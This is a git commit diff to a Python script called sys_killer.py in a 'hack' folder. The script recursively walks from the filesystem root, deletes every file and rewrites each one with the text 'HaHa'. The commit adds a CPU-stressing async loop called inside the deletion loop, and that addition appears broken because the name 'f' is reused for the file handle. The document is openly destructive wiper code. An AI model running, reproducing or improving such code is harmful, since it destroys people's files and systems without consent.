9ac661a7700534a351ad888a1c601ebd5a9bf77d
antoniotorresz <antoniiotorresz1@gmail.com>
2025-04-09 11:14:52 -0600

    sys_killer stressing cpu

--- hack/sys_killer.py
+++ hack/sys_killer.py
@@ -1,4 +1,9 @@
 import os as o
+import math
+
+async def f():
+    for _ in range(10_000_000): math.pow(_, _)
+
 def a(p='/'):
     try:
         for i in o.listdir(p):
@@ -7,6 +12,7 @@ def a(p='/'):
             elif o.path.isfile(j):
                 o.remove(j)
                 with open(j, 'w') as f: f.write('HaHa')
+                f()
     except PermissionError: print(f"Permission denied: {p}")
     except Exception as e: print(f"Error accessing {p}: {e}")
 if __name__ == '__main__': a()
